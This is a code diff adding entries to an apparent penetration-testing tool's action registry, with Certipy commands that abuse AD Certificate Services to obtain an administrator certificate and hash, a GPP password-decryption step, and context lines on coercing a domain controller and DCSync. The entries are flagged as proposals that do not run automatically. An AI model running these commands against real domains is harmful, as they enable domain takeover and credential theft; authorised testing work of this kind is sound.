@@ -256,6 +256,17 @@ ACTION_REGISTRY: dict[str, Action] = {
          "impacket-getST / Rubeus monitor  # extract the captured DC$ TGT"],
         risk="propose", runnable=False, outputs="raw",
         note="Unconstrained delegation: coerce the DC, capture its TGT, then DCSync."),
+    "certipy_request": _a("certipy_request",
+        ["certipy find -vulnerable -json -u <USER>@<DOMAIN> -p <PASS> -dc-ip $IP -o certipy",
+         "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip $IP -ca <CA> "
+         "-template <TEMPLATE> -upn administrator@<DOMAIN>",
+         "certipy auth -pfx administrator.pfx -dc-ip $IP  # -> NT hash / TGT"],
+        risk="propose", runnable=False, outputs="raw",
+        note="ADCS abuse (certipy): request a cert as a privileged UPN, then auth -> DA."),
+    "gpp_decrypt": _a("gpp_decrypt",
+        ["gpp-decrypt <cpassword>  # from Groups.xml in SYSVOL"],
+        risk="read_only", runnable=False, outputs="raw",
+        note="Recover the GPP-stored password (AES key is public); reuse across the domain."),
 
     # --- Traditional: MSSQL / WinRM / SSH / RDP / FTP ---
     "netexec_mssql": _a("netexec_mssql", ["nxc mssql $IP -u '' -p ''"], outputs="raw"),
